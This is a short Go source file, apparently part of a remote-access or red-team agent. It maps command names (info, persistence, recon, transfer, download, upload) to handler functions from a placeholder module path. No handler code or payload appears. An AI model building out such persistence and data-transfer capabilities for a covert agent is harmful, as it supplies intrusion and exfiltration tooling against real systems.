package commands

import (
	info "nombredetuapp/Documents/Proyecto/src/commands/Info"
	"nombredetuapp/Documents/Proyecto/src/commands/persistence"
	"nombredetuapp/Documents/Proyecto/src/commands/recon"
	"nombredetuapp/Documents/Proyecto/src/commands/transfer"
)

type CommandHandler func(args []string) string

var Commands = map[string]CommandHandler{
	"info":        info.InfoCommand,
	"persistence": persistence.PersistenceCommand,
	"recon":       recon.ReconCommand,
	"transfer":    transfer.TransferCommand,

	// Shortcuts para file transfer (aliases)
	"download": func(args []string) string {
		return transfer.TransferCommand(append([]string{"download"}, args...))
	},
	"upload": func(args []string) string {
		return transfer.TransferCommand(append([]string{"upload"}, args...))
	},
	// "help": HelpCommand,
}
